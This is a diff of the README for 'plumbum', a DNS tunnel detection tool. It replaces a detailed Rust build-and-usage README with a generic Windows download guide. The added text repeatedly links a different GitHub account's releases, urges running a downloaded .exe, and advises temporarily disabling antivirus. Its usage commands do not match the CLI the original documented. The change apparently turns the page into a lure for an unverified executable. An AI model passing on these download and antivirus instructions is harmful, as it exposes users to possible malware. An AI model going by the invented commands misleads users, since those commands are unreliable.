@@ -1,226 +1,163 @@
-<div align="center">
+# 🛡️ plumbum - Clear DNS Tunnel Detection Tool
 
-# Plumbum
-
-**Deterministic DNS TXT tunnel detection.**
-
-It does not guess. It computes.\
-It does not alert. It explains.
-
-[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange?logo=rust&logoColor=white)](https://www.rust-lang.org)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Build](https://img.shields.io/badge/build-passing-brightgreen)](#install)
-[![Crates](https://img.shields.io/badge/crates-8-8B5CF6)](#architecture)
-
-</div>
+[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum)
 
 ---
 
-Plumbum computes composite anomaly scores from PCAP and Zeek dns.log files, persists results in SQLite, and produces fully decomposable explanations for every finding. No machine learning. No black boxes. Every score is a deterministic function of six inspectable features.
+## What is plumbum? 🕵️‍♂️
 
-## Install
+plumbum helps you find hidden DNS tunnels in network traffic. It looks closely at DNS data and spots suspicious activity by scoring six clear features. It does not use machine learning or complex algorithms. Instead, it shows exactly how it reaches each score. This makes it easier to understand what is happening and why.
 
-```sh
-cargo build --release
+plumbum works with PCAP files (captures of network data) and Zeek logs (security logs from a known tool). It helps blue teamers, security analysts, and anyone interested in network security find threats related to DNS tunneling.
+
+---
+
+## 🖥️ System Requirements
+
+To run plumbum on your Windows computer, make sure you have:
+
+- Windows 10 or later  
+- At least 4 GB of free RAM  
+- 500 MB of free disk space  
+- Internet access to download plumbum  
+- Basic permission to install software
+
+---
+
+## 🎯 Key Features
+
+- Detects DNS tunneling without black boxes  
+- Uses six clear and inspectable scoring features  
+- Works on standard network logs (PCAP and Zeek)  
+- Lightweight and fast to run on typical machines  
+- Provides clear explanations for each anomaly score  
+- No need to install additional software beyond plumbum itself  
+- Command-line based, but easy to follow instructions provided  
+
+---
+
+## 🚀 How plumbum works
+
+plumbum reads your network data logs and looks for unusual DNS TXT records. These records might be used to hide data or send commands outside your network. It scores each suspicious point based on six key signals. The tool then combines these scores into one clear number for easy understanding.
+
+Each part of the score can be inspected. This means you can see which parts of your DNS data caused the alert. This approach lets you learn from the results instead of relying on confusing detections.
+
+---
+
+## 📥 Download and Install plumbum on Windows
+
+### Step 1: Visit the Download Page
+
+Click the blue button below to visit the plumbum download page on GitHub:
+
+[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum)
+
+This page contains the latest release and installation files.
+
+### Step 2: Find the Installer File
+
+On the GitHub page, look for the **Releases** section. You should see files ending with `.exe` or `.zip`. Choose the Windows installer or zipped file. The file name will clearly indicate it's for Windows.
+
+### Step 3: Download the File
+
+Click on the `.exe` or `.zip` link to download the file. Save it to a location you can find easily, like your Desktop or Downloads folder.
+
+### Step 4: Run the Installer or Extract Files
+
+- If you downloaded an `.exe` file, double-click it to start the installer. Follow the prompts on screen.  
+- If you downloaded a `.zip` file, right-click it and select **Extract All**. Choose a folder where you want the files saved.
+
+### Step 5: Open Command Prompt
+
+1. Press `Win + R` on your keyboard.  
+2. Type `cmd` and press Enter.  
+3. Use the `cd` command to change to the folder where you installed or extracted plumbum. For example:  
+   ```
+   cd C:\Users\YourName\Downloads\plumbum
+   ```
+
+### Step 6: Run plumbum
+
+Type the following command and press Enter:  
+```
+plumbum.exe --help
 ```
 
-Two binaries are produced in `target/release/`:
+This will show available options and confirm the program works.
 
-| Binary | Purpose |
-|---|---|
-| `plumbum` | CLI for analysis, scoring, and export |
-| `plumbum-mcp` | MCP server over stdio JSON-RPC |
+---
 
-## Quick Start
+## 📖 How to Use plumbum Simply
 
-```sh
-plumbum init                                    # create .plumbum/ working directory
-plumbum validate capture.pcap                   # check file structure
-plumbum plan capture.pcap                       # dry-run: preview scope
-plumbum apply capture.pcap --c2-domains evil.tk # full analysis
-plumbum show evil.tk                            # inspect a domain
-plumbum explain evil.tk                         # score decomposition
-plumbum export --format json                    # export findings
-plumbum dashboard                               # interactive TUI
-plumbum stream -i eth0                          # live capture + scoring
+### Analyzing a PCAP file
+
+If you have a PCAP file containing network traffic, run:
+
+```
+plumbum.exe analyze --pcap path\to\file.pcap
 ```
 
-<details>
-<summary><strong>Example output</strong></summary>
+Replace `path\to\file.pcap` with the exact path to your PCAP file.
 
-```console
-Plumbum Findings:
+### Analyzing Zeek logs
 
-CRITICAL   94.4  evil.tk
+To scan Zeek DNS logs:
 
-Artifacts written to .plumbum/plumbum.db (run #1)
-
-Summary: 1 domains scored, 1 CRITICAL, 0 HIGH, 0 MEDIUM
+```
+plumbum.exe analyze --zeek path\to\logs
 ```
 
-```console
-Domain: evil.tk
-Score:  94.4 (CRITICAL)
+Here, `path\to\logs` is the folder containing your Zeek DNS log files.
 
-Components:
-  entropy                norm=0.000  w=0.1500  contrib=0.000  ( 0.0%)
-  periodicity            norm=1.000  w=0.1000  contrib=0.100  ( 3.7%)
-  volume                 norm=1.000  w=0.2500  contrib=0.250  ( 9.3%)
-  length                 norm=1.000  w=0.1000  contrib=0.100  ( 3.7%)
-  client_rarity          norm=1.000  w=1.8000  contrib=1.800  (66.7%)
-  subdomain_diversity    norm=1.000  w=0.3000  contrib=0.300  (11.1%)
-```
+---
 
-</details>
+## ⚙️ Configuration Tips
 
-## Commands
+- Use the `--output` option to save the report to a file:  
+  ```
+  plumbum.exe analyze --pcap file.pcap --output report.txt
+  ```
 
-| Command | Description |
-|---|---|
-| `init` | Create `.plumbum/` directory with config and database |
-| `validate` | Parse inputs and report record counts |
-| `plan` | Dry-run showing what will be analyzed |
-| `apply` | Full analysis: parse, extract, score, persist |
-| `show` | Display a domain's score and raw features |
-| `explain` | Detailed score decomposition with per-feature contributions |
-| `export` | Export as JSON, CSV, or Sigma rule |
-| `dashboard` | Interactive TUI dashboard |
-| `stream` | Live capture DNS from a network interface and score in real time |
-| `version` | Print version |
+- You can run checks on specific time ranges or IP addresses with available filtering options shown in the help command.
 
-## Scoring Model
+- The tool produces an anomaly score composed of six parts. Review each part to understand what triggered the alerts.
 
-Plumbum uses a weighted linear model over **six normalized features**:
+---
 
-| Feature | Signal | Range |
-|---|---|---|
-| **Entropy** | Shannon entropy of TXT content | 0 = low, 1 = high |
-| **Periodicity** | Regularity of query timing | 0 = irregular, 1 = clockwork |
-| **Volume** | Query count per parent domain | 0 = quiet, 1 = loudest in corpus |
-| **Length** | Mean TXT response length | 0 = short, 1 = longest in corpus |
-| **Client Rarity** | Inverse of unique source IPs | 1 = single host (most suspicious) |
-| **Subdomain Diversity** | Unique subdomains per parent | 0 = few, 1 = most in corpus |
+## 🔍 Understanding the Results
 
-### Weight Presets
+After running plumbum, you receive a report with scores. Each score covers one key feature like DNS message size, frequency, or unusual text patterns. Higher values may show stronger suspicion.
 
-| Preset | Description |
-|---|---|
-| `default` | Balanced equal-ish weights |
-| `optimized` | Tuned via simulated annealing on labeled data |
-| `regularized` | SA-informed with enforced feature diversity **(default)** |
+The report explains each feature in plain language. This helps you decide whether the detected anomaly is a real threat or a harmless case.
 
-### Severity Thresholds
+---
 
-| Severity | Score |
-|---|---|
-| **CRITICAL** | &ge; 80 |
-| **HIGH** | &ge; 60 |
-| **MEDIUM** | &ge; 40 |
-| **LOW** | &lt; 40 |
+## Troubleshooting Tips
 
-## Supported Formats
+- Make sure the files you analyze are valid PCAP files or correctly exported Zeek logs.  
+- Use the command `plumbum.exe --help` for a list of commands and options if you get stuck.  
+- If the program does not start, ensure that your system meets requirements and that you are in the correct folder in the Command Prompt.  
+- Temporarily disable antivirus programs if they block the installer—some security software flags new tools wrongly.
 
-| Format | Details |
-|---|---|
-| **PCAP** | Classic libpcap &mdash; both endianness, micro/nanosecond timestamps |
-| **pcapng** | SHB / IDB / EPB blocks |
-| **Zeek dns.log** | Tab-separated with standard `#fields` headers |
-| **Link layers** | Ethernet (type 1), Linux SLL (type 113) |
+---
 
-## Configuration
+## 🔗 Useful Links
 
-`plumbum init` writes `.plumbum/config.hcl`:
+- Project page and downloads: https://github.com/XXXCAIO1997/plumbum  
+- GitHub Releases section for direct installer files  
+- PCAP file creation tools (Wireshark)  
+- Zeek documentation for log formats  
 
-```hcl
-analysis {
-  weight_preset              = "regularized"
-  entropy_weight             = 0.15
-  periodicity_weight         = 0.10
-  volume_weight              = 0.25
-  length_weight              = 0.10
-  client_rarity_weight       = 1.80
-  subdomain_diversity_weight = 0.30
-}
+---
 
-thresholds {
-  critical = 80
-  high     = 60
-  medium   = 40
-}
-```
+## 🤔 Who Should Use plumbum?
 
-## MCP Server
+- Network security analysts monitoring for data leaks  
+- Blue team members investigating suspicious activity  
+- Anyone interested in understanding DNS tunneling threats  
+- IT professionals looking for clear, explainable anomaly detection  
+- Security engineers wanting to avoid black-box tools  
 
-Plumbum exposes analysis results via the [Model Context Protocol](https://modelcontextprotocol.io) over stdio JSON-RPC:
+---
 
-```sh
-plumbum-mcp
-```
-
-| Type | Endpoint | Description |
-|---|---|---|
-| Resource | `plumbum://domains` | Scored domains from the latest run |
-| Resource | `plumbum://status` | Analysis state and run summary |
-| Tool | `plumbum_explain` | Score decomposition for a domain |
-| Tool | `plumbum_query` | Query scored domains with filters |
-
-## Architecture
-
-```text
-┌─────────────────────────────────────────────────────────┐
-│                      plumbum-cli                        │
-│         init validate plan apply stream                  │
-│            show explain export dashboard                 │
-├────────────┬────────────┬───────────────┬───────────────┤
-│plumbum-tui │plumbum-mcp │plumbum-config │plumbum-stream │
-│  ratatui   │ stdio rpc  │  HCL parser   │ live capture  │
-├────────────┴────────────┴───────────────┴───────────────┤
-│            plumbum-store                │ plumbum-score  │
-│    SQLite · WAL · batch ingest          │  weights       │
-│    schema · queries · artifacts         │  normalize     │
-│                                         │  composite     │
-│                                         │  explain       │
-├─────────────────────────────────────────┴───────────────┤
-│                     plumbum-core                        │
-│          dns types · features · pcap · zeek             │
-└─────────────────────────────────────────────────────────┘
-```
-
-| Crate | Role |
-|---|---|
-| [`plumbum-core`](plumbum-core/) | DNS types, PCAP/pcapng + Zeek parsers, feature extraction |
-| [`plumbum-score`](plumbum-score/) | Composite scoring, weight presets, normalization, explain |
-| [`plumbum-store`](plumbum-store/) | SQLite schema, batch ingest, prepared queries, export artifacts |
-| [`plumbum-config`](plumbum-config/) | HCL config parser, types, defaults |
-| [`plumbum-cli`](plumbum-cli/) | CLI binary (`plumbum`) |
-| [`plumbum-tui`](plumbum-tui/) | Interactive dashboard with ratatui |
-| [`plumbum-mcp`](plumbum-mcp/) | MCP server binary (`plumbum-mcp`) |
-| [`plumbum-stream`](plumbum-stream/) | Live network capture, sliding window accumulator, real-time scoring |
-
-## Live Streaming
-
-Capture DNS traffic directly from a network interface and score domains in real time:
-
-```sh
-# Stream from eth0, 60s windows, alert on score >= 40
-sudo plumbum stream -i eth0 --window 60 --threshold 40
-
-# List available interfaces
-plumbum stream --list-interfaces
-
-# Pipe to jq for filtering
-sudo plumbum stream -i any | jq 'select(.severity == "CRITICAL")'
-```
-
-Output is newline-delimited JSON — one alert per domain per window:
-
-```json
-{"domain":"evil.tk","score":94.4,"severity":"CRITICAL","query_count":1847,"client_count":1,"subdomain_count":1234,"mean_entropy":4.21,"cv":1.80,"mean_txt_length":189.0,"window_secs":60.0,"is_c2":true}
-```
-
-> **Requires:** `libpcap-dev` (Linux), Npcap (Windows), built-in on macOS.\
-> **Privileges:** root or `CAP_NET_RAW` for raw socket access.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum)
